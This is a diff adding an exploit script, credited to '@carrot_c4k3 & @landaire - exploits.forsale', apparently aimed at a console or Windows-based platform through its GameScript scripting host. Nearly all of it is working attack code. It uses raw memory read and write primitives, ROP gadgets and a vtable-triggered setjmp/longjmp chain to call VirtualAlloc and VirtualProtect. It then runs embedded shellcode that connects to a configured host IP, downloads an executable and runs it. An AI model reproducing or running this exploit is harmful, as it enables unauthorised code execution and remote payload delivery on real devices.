@@ -1,0 +1,364 @@
+//
+// Collateral Damage - @carrot_c4k3 & @landaire - exploits.forsale
+//
+
+// !!! PUT YOUR IP BELOW !!!
+// EX: var host_ip = "192.168.1.89"
+var host_ip = "[YOUR IP HERE]"
+
+// PE loader shellcode
+let pe_loader_code = [
+233,22,1,0,0,21,0,0,120,22,0,0,15,21,0,0,237,21,0,0,144,22,0,0,237,21,0,0,117,22,0,0,164,22,0,0,0,0,0,0,37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,46,46,92,76,111,99,97,108,83,116,97,116,101,92,114,117,110,46,101,120,101,0,87,83,50,95,51,50,46,100,108,108,0,87,83,65,83,116,97,114,116,117,112,0,87,83,65,67,111,110,110,101,99,116,0,87,83,65,83,111,99,107,101,116,65,0,105,110,101,116,95,97,100,100,114,0,69,120,112,97,110,100,69,110,118,105,114,111,110,109,101,110,116,83,116,114,105,110,103,115,65,0,76,111,97,100,76,105,98,114,97,114,121,65,0,67,114,101,97,116,101,70,105,108,101,65,0,87,114,105,116,101,70,105,108,101,0,82,101,97,100,70,105,108,101,0,86,105,114,116,117,97,108,65,108,108,111,99,0,86,105,114,116,117,97,108,70,114,101,101,0,86,105,114,116,117,97,108,80,114,111,116,101,99,116,0,67,108,111,115,101,72,97,110,100,108,101,0,0,0,0,24,0,0,0,0,128,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,87,65,86,65,85,65,84,86,87,85,83,72,129,236,248,2,0,0,72,131,228,240,72,184,75,0,69,0,82,0,78,0,72,141,140,36,152,0,0,0,72,137,1,72,184,69,0,76,0,66,0,65,0,72,137,65,8,72,184,83,0,69,0,46,0,68,0,72,137,65,16,199,65,24,76,0,76,0,102,131,97,28,0,232,124,4,0,0,72,133,192,116,65,72,137,214,72,184,87,0,83,0,50,0,95,0,72,141,140,36,152,0,0,0,72,137,1,72,184,51,0,50,0,46,0,100,0,72,137,65,8,199,65,16,108,0,108,0,102,131,97,20,0,232,64,4,0,0,72,133,192,116,20,72,137,215,235,51,72,184,4,20,0,0,1,0,0,0,233,53,3,0,0,72,141,21,208,254,255,255,72,137,241,232,58,3,0,0,72,141,13,113,254,255,255,255,208,72,137,199,72,133,192,15,132,151,2,0,0,72,141,21,216,254,255,255,72,137,241,232,22,3,0,0,72,137,68,36,120,72,141,21,209,254,255,255,72,137,241,232,2,3,0,0,72,137,68,36,112,72,141,21,201,254,255,255,72,137,241,232,238,2,0,0,72,137,68,36,104,72,141,21,125,254,255,255,72,137,241,232,218,2,0,0,73,137,197,72,141,21,129,254,255,255,72,137,241,232,200,2,0,0,73,137,199,72,141,21,101,254,255,255,72,137,241,232,182,2,0,0,72,137,68,36,88,72,141,21,140,254,255,255,72,137,241,232,162,2,0,0,72,137,68,36,96,72,141,21,10,254,255,255,72,137,241,232,142,2,0,0,72,137,195,72,141,21,205,253,255,255,72,137,249,232,124,2,0,0,72,137,197,72,141,21,209,253,255,255,72,137,249,232,106,2,0,0,73,137,198,72,141,21,180,253,255,255,72,137,249,232,88,2,0,0,72,137,198,72,141,21,184,253,255,255,72,137,249,232,70,2,0,0,72,137,199,72,141,13,85,253,255,255,76,141,164,36,48,2,0,0,76,137,226,65,184,200,0,0,0,255,211,72,131,100,36,48,0,199,68,36,40,128,0,0,0,199,68,36,32,2,0,0,0,76,137,225,186,0,0,0,64,69,49,192,69,49,201,65,255,213,73,137,196,72,141,148,36,152,0,0,0,102,185,2,2,255,213,131,100,36,40,0,72,131,100,36,32,0,185,2,0,0,0,186,1,0,0,0,65,184,6,0,0,0,69,49,201,65,255,214,72,137,197,185,0,0,0,68,255,215,72,141,148,36,136,0,0,0,199,2,2,0,31,144,137,66,4,72,131,98,8,0,72,131,100,36,48,0,72,131,100,36,40,0,72,131,100,36,32,0,72,137,233,65,184,16,0,0,0,69,49,201,255,214,76,141,76,36,68,65,131,33,0,72,141,84,36,72,131,34,0,72,131,100,36,32,0,72,137,233,65,184,4,0,0,0,65,255,215,133,192,15,132,208,0,0,0,139,124,36,72,15,207,49,201,72,137,250,65,184,0,16,0,0,65,185,4,0,0,0,72,139,92,36,120,255,211,72,137,198,72,131,100,36,32,0,76,141,76,36,68,72,137,233,72,137,194,65,137,248,65,255,215,137,193,184,3,0,0,16,133,201,15,132,10,1,0,0,57,124,36,68,15,133,0,1,0,0,72,141,84,36,76,131,34,0,72,131,100,36,32,0,76,141,76,36,68,72,137,233,65,184,4,0,0,0,65,255,215,133,192,116,111,76,137,100,36,80,68,139,108,36,76,65,15,205,49,201,76,137,234,65,184,0,16,0,0,65,185,4,0,0,0,255,211,73,137,196,72,141,92,36,68,77,137,238,77,133,246,126,70,76,137,234,76,41,242,76,1,226,72,131,100,36,32,0,72,137,233,69,137,240,73,137,217,65,255,215,133,192,15,132,133,0,0,0,139,68,36,68,73,41,198,235,207,184,2,0,0,16,235,122,72,184,4,36,0,0,1,0,0,0,235,110,184,4,0,0,16,235,103,76,141,140,36,128,0,0,0,65,131,33,0,72,137,241,72,137,250,65,184,32,0,0,0,255,84,36,104,76,141,140,36,132,0,0,0,65,131,33,0,72,131,100,36,32,0,72,139,124,36,80,72,137,249,76,137,226,69,137,232,255,84,36,88,76,137,225,49,210,65,184,0,128,0,0,255,84,36,112,72,137,249,72,139,124,36,96,255,215,72,137,233,255,215,255,214,235,5,184,5,0,0,16,72,129,196,248,2,0,0,91,93,95,94,65,92,65,93,65,94,65,95,195,65,87,65,86,65,85,65,84,86,87,85,83,102,129,57,77,90,15,133,159,0,0,0,139,65,60,139,132,1,136,0,0,0,68,139,76,1,24,68,139,68,1,28,68,139,92,1,32,68,139,84,1,36,49,192,69,49,228,77,57,204,15,132,142,0,0,0,73,141,124,36,1,68,137,230,65,141,28,179,139,28,25,128,60,25,0,73,137,252,116,223,72,1,203,73,199,199,255,255,255,255,69,49,228,77,137,230,66,128,124,59,1,0,77,141,127,1,77,141,100,36,1,117,236,73,199,197,255,255,255,255,66,128,124,42,1,0,77,141,109,1,117,244,73,137,252,77,57,253,117,163,69,49,255,73,131,238,1,114,26,66,138,44,58,77,141,103,1,66,58,44,59,77,137,231,116,233,73,137,252,235,132,49,192,235,23,65,141,4,114,15,183,4,1,37,255,63,0,0,65,141,4,128,139,4,1,72,1,200,91,93,95,94,65,92,65,93,65,94,65,95,195,86,101,72,139,4,37,96,0,0,0,72,139,80,24,72,131,194,16,49,192,73,137,208,77,139,72,96,77,133,201,116,83,73,199,195,255,255,255,255,49,246,73,137,242,102,67,131,124,89,2,0,77,141,91,1,72,141,118,1,117,236,72,199,198,255,255,255,255,102,131,124,113,2,0,72,141,118,1,117,244,76,57,222,117,30,69,49,219,73,131,234,1,114,31,67,15,183,52,25,102,66,51,52,25,73,131,195,2,102,247,198,223,255,116,229,77,139,0,73,57,208,117,156,235,9,73,139,80,48,184,1,0,0,0,94,195,204,204,204,1,19,10,0,19,1,95,0,12,48,11,80,10,112,9,96,8,192,6,208,4,224,2,240,1,12,8,0,12,48,11,80,10,112,9,96,8,192,6,208,4,224,2,240,1,1,1,0,1,96,0,0
+]
+
+
+// hex printing helper functions
+let i2c_map = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
+let c2i_map = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'A': 0xA, 'B': 0xB, 'C': 0xC, 'D': 0xD, 'E': 0xE, 'F': 0xF}
+
+fn hex_to_num(s) {
+	var str_len = len(s)
+	var res = 0
+	for (var i = 0; i < str_len; i++)
+	{
+		res = res << 4
+		res = res + c2i_map[s[i]]
+	}
+	return res
+}
+
+fn num_to_hex(num, byte_count) {
+	if (byte_count > 8) {
+		byte_count = 8
+	}
+	var res = ""
+	for (var i = 0; i < byte_count * 2; i++) {
+		var idx = (num >> (4 * i)) & 15
+		res = i2c_map[idx] + res 
+	}
+	return res
+}
+
+fn num_to_hex8(num) {
+	return num_to_hex(num, 1)
+}
+
+fn num_to_hex16(num) {
+	return num_to_hex(num, 2)
+}
+
+fn num_to_hex32(num) {
+	return num_to_hex(num, 4)
+}
+
+fn num_to_hex64(num) {
+	return num_to_hex(num, 8)
+}
+
+fn hex_dump(addr, count) {
+	for (var i = 0; i < count; i++) {
+		if (i > 0 && (i % 16) == 0) {
+			printConsole("\n")
+		}
+		var cur_byte = pointerGetUnsignedInteger8Bit(0, addr + i)
+		printConsole(num_to_hex8(cur_byte) + " ")
+	}
+}
+
+fn array_fill(arr) {
+	var arr_len = len(arr)
+	for (var i = 0; i < arr_len; i++) {
+		arr[i] = 0x41
+	}
+}
+
+fn round_down(val, bound) {
+	return floor(val - (val % bound))
+}
+
+fn array_compare(a1, a2) {
+	if (len(a1) != len(a2)) {
+		return false
+	}
+	var arr_len = len(a1)
+	
+	for (var i = 0; i < arr_len; i++) {
+		if (a1[i] != a2[i]) {
+			return false
+		}
+	}
+
+	return true
+}
+
+// shorthand helpers for memory access
+fn write8(addr, val) {
+	pointerSetUnsignedInteger8Bit(0, addr, val)
+}
+
+fn read8(addr) {
+	return pointerGetUnsignedInteger8Bit(0, addr)
+}
+
+fn write16(addr, val) {
+	pointerSetAtOffsetUnsignedInteger16Bit(0, addr, val)
+}
+
+fn read16(addr) {
+	return pointerGetAtOffsetUnsignedInteger16Bit(0, addr)
+}
+
+fn write32(addr, val) {
+	pointerSetAtOffsetUnsignedInteger(0, addr, val)
+}
+
+fn read32(addr) {
+	return pointerGetAtOffsetUnsignedInteger(0, addr)
+}
+
+
+fn write64(addr, val) {
+	pointerSetAtOffsetUnsignedInteger64Bit(0, addr, val)
+}
+
+fn read64(addr) {
+	return pointerGetAtOffsetUnsignedInteger64Bit(0, addr)
+}
+
+// helper to read a 64-bit val and automatically make it a hex str
+fn read64_hex(addr) {
+	var val_low = read32(addr)
+	var val_high = read32(addr+4)
+	return num_to_hex32(val_high) + num_to_hex32(val_low)
+}
+
+fn read_buf(addr, buf) {
+	var buf_len = len(buf)
+	for (var i = 0; i < buf_len; i++) {
+		buf[i] = read8(addr + i)
+	}
+}
+
+fn write_buf(addr, buf) {
+	var buf_len = len(buf)
+	for (var i = 0; i < buf_len; i++) {
+		write8(addr+i, buf[i])
+	}
+}
+
+fn find_bytes(addr, max_len, pattern, buf) {
+	for (var i = 0; i < max_len; i++) {
+		read_buf(addr + i, buf)
+		if (array_compare(pattern, buf)) {
+			return addr + i
+		}
+	}
+	return 0
+}
+
+fn find64(addr, max_len, v) {
+	var offset = 0
+	while (1) {
+		var temp_val = read64(addr+offset)
+		if (temp_val == v) {
+			return addr+offset
+		}
+		offset += 8
+	}
+	return 0
+}
+
+// shorthand funcs
+fn ptr_to_num(p) {
+	return numberFromRaw64BitUnsignedInteger(p)
+}
+
+fn make_cstr(s) {
+	var str_len = len(s) + 1
+	var s_ptr = globalArrayNew8Bit(s, str_len)
+	pointerSetString(s_ptr, 0, s)
+	return ptr_to_num(s_ptr)
+}
+
+var gs_base = 0
+var ntdll_base = 0
+var kernelbase_base = 0
+var longjmp_ptr = 0
+var setjmp_ptr = 0
+var gadget_ptr = 0
+var gadget_rsp0x48_ptr = 0
+var gadget_pushrax_ptr = 0
+fn call_native(func_ptr, rcx, rdx, r8, r9) {
+	// set this gadget here
+	gadget_rsp0x48_ptr = gs_base + 0xE04B
+	gadget_pushrax_ptr = gs_base + 0x1F13A
+	var call_done = false
+
+	// allocate 0x120 (space for vtable + setjmp data)
+	var obj_ptr = globalArrayNew8Bit("call", 0x100)
+	var objp = ptr_to_num(obj_ptr)
+	var vt_ptr = globalArrayNew8Bit("vtable", 0x18)
+	var vtp = ptr_to_num(vt_ptr)
+	var stack_size = 0x4000
+	var stack_ptr = globalArrayNew8Bit("stack", stack_size)
+	var stackp = ptr_to_num(stack_ptr)
+	var jmpctx_ptr = globalArrayNew8Bit("jctx", 0x100)
+	var jcp = ptr_to_num(jmpctx_ptr)
+
+	// set up vtable pointers
+	write64(vtp+8, setjmp_ptr)
+	write64(objp, vtp)
+
+	// trigger vtable call
+	slBus_destroy(obj_ptr)
+
+	memcpy(jmpctx_ptr, 0, obj_ptr, 0, 0x100)
+
+	// set up our rop chain
+	var r10 = 0
+	var r11 = 0
+	write64(stackp+stack_size-0xA0, rdx)
+	write64(stackp+stack_size-0x98, rcx)
+	write64(stackp+stack_size-0x90, r8)
+	write64(stackp+stack_size-0x88, r9)
+	write64(stackp+stack_size-0x80, r10)
+	write64(stackp+stack_size-0x78, r11)
+	write64(stackp+stack_size-0x70, func_ptr)
+	write64(stackp+stack_size-0x68, gadget_pushrax_ptr)
+	// 0x30 bytes of padding
+	write64(stackp+stack_size-0x38, 0x15151515)
+	write64(stackp+stack_size-0x30, gs_base+0x109C4A)
+	write64(stackp+stack_size-0x28, jcp)
+	write64(stackp+stack_size-0x20, longjmp_ptr);
+	
+	// set up the context to do the longjmp
+	write64(vtp+8, longjmp_ptr)
+	write64(objp, vtp)
+	// rsp
+	write64(objp+0x10, stackp+stack_size-0xA0)
+	// rip
+	write64(objp+0x50, gadget_ptr)
+	
+	// trigger vtable call
+	slBus_destroy(obj_ptr)
+	var ret_val = read64(stackp+stack_size-0x68)
+
+	// clean up our objects
+	globalArrayDelete("call")
+	globalArrayDelete("vtable")
+	globalArrayDelete("stack")
+	globalArrayDelete("jctx")
+
+	return ret_val
+}
+
+fn find_module_base(addr) {
+	var search_addr = round_down(addr, 0x10000)	
+
+	while (1) {
+		var magic_static = [0x4D, 0x5A]
+		var magic_read = [0, 0]
+		read_buf(search_addr, magic_read)
+
+		if (array_compare(magic_static, magic_read)) {
+			return search_addr
+		}
+		search_addr -= 0x10000
+	}
+	return 0
+}
+
+fn get_dll_exports(base_addr) {
+	var res = {}
+	var magic_static = [0x4D, 0x5A]
+	var magic_read = [0, 0]
+	read_buf(base_addr, magic_read)
+
+	if (!array_compare(magic_static, magic_read)) {
+		printConsole("Magic is invalid!\n")
+		return res
+	}
+
+	
+	var e_lfanew = read32(base_addr+0x3c)
+	var exports_addr = base_addr + read32(base_addr+e_lfanew+0x70+0x18)
+
+	var num_funcs = read32(exports_addr+0x14)
+	var num_names = read32(exports_addr+0x18)
+
+	var funcs_addr = base_addr + read32(exports_addr+0x1c)
+	var names_addr = base_addr + read32(exports_addr+0x20)
+	var ords_addr = base_addr + read32(exports_addr+0x24)
+
+	for (var i = 0; i < num_names; i++) {
+		var name_addr = base_addr + read32(names_addr + (4 * i))
+		var name_str = pointerGetSubstring(0, name_addr, 0x20)
+		var ordinal = read16(ords_addr + (2 * i))
+		var func_addr =  base_addr + read32(funcs_addr + (4 * ordinal))
+		res[name_str] = func_addr
+		//printConsole("Export: " + name_str + " - " + num_to_hex64(func_addr) + "\n")
+	}
+
+	return res
+}
+
+var VirtualAlloc_ptr = 0
+var VirtualProtect_ptr = 0
+fn map_code(code) {
+	var code_addr = call_native(VirtualAlloc_ptr, 0, 0x100000, 0x3000, 4)
+	write_buf(code_addr, code)
+
+	var oldp_ptr = globalArrayNew8Bit("oldp", 0x100)
+	var oldpp = ptr_to_num(oldp_ptr)
+	call_native(VirtualProtect_ptr, code_addr, 0x100000, 0x20, oldpp)
+	return code_addr
+}
+
+fn map_page(addr) {
+	var code_addr = call_native(VirtualAlloc_ptr, addr, 0x100000, 0x3000, 4)
+	return code_addr
+}
+
+
+// create and dump our object to the terminal
+var slbus_ptr = slBus_create()
+var slp = numberFromRaw64BitUnsignedInteger(slbus_ptr)
+
+// get the base of the GameScript module via the vtable
+gs_base = read64(slp) - 0x16faf8
+
+ntdll_base = find_module_base(read64(gs_base + 0x125398))
+kernelbase_base = find_module_base(read64(gs_base + 0x1253A0))
+
+var setjmp_bytes = [0x48,0x89,0x11,0x48,0x89,0x59,0x08,0x48,0x89,0x69,0x18,0x48,0x89,0x71,0x20,0x48]
+var longjmp_bytes = [0x48,0x8B,0xC2,0x48,0x8B,0x59,0x08,0x48,0x8B,0x71,0x20,0x48,0x8B,0x79,0x28,0x4C]
+var tmp_bytes = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
+
+setjmp_ptr = find_bytes(ntdll_base, 0x217000, setjmp_bytes, tmp_bytes)
+longjmp_ptr = find_bytes(ntdll_base, 0x217000, longjmp_bytes, tmp_bytes)
+
+// bytes for the following gadget: pop rdx;pop rcx;pop r8;pop r9;pop r10;pop r11; ret
+var gadget_bytes = [0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]
+tmp_bytes = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
+gadget_ptr = find_bytes(ntdll_base, 0x217000, gadget_bytes, tmp_bytes)
+
+
+// get the ntdll & kernel base exports and find VirtualAlloc/Protect
+var kernelbase_exports = get_dll_exports(kernelbase_base)
+var ntdll_exports = get_dll_exports(ntdll_base)
+VirtualAlloc_ptr = kernelbase_exports["VirtualAlloc"]
+VirtualProtect_ptr = kernelbase_exports["VirtualProtect"]
+var VirtualFree_ptr = kernelbase_exports["VirtualFree"]
+
+
+// allocate our token info buffer
+var tinfo_ptr = globalArrayNew8Bit("tinfo", 0x2000)
+var tinfop = ptr_to_num(tinfo_ptr)
+
+// write the ip to the global page
+var global_page = map_page(0x44000000)
+pointerSetString(0, global_page, host_ip)
+
+// map the pe loader
+var pe_loader_ptr = map_code(pe_loader_code)
+var pe_ret = call_native(pe_loader_ptr, 0, 0, 0, 0)
